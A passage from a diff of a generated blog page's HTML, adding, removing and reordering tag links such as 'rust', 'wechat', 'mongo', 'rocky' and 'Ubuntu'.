+                <a href="javascript:void(0)" class="js-tag color5">rust</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">微信支付</a>
+                <a href="javascript:void(0)" class="js-tag color2">wechat</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1700,6 +1720,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">mongo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">微信支付</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1731,15 +1755,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">ubuntu</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">rocky</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Ubuntu</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">ubuntu</a>
               </li>
              
               <li class="article-tag-list-item">
